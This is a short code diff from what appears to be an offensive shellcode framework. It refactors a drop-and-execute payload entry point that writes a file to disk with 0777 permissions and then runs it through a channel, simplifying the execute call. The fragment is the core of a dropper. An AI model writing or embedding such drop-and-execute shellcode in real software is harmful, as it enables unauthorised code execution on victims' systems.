@@ -23,9 +23,6 @@ SHELLCODE_ENTRY
     /* Drop executable file. */
     File::create(file_path, File::TRUNCATE | File::WRITE, 0777).write(file_contents);
 
-    char *const argv[] = { NULL };
-    char *const envp[] = { NULL };
-
     /* Execute the dropped executable. */
-    execute(file_path, argv, envp, channel);
+    Process::execute(file_path, channel);
 }
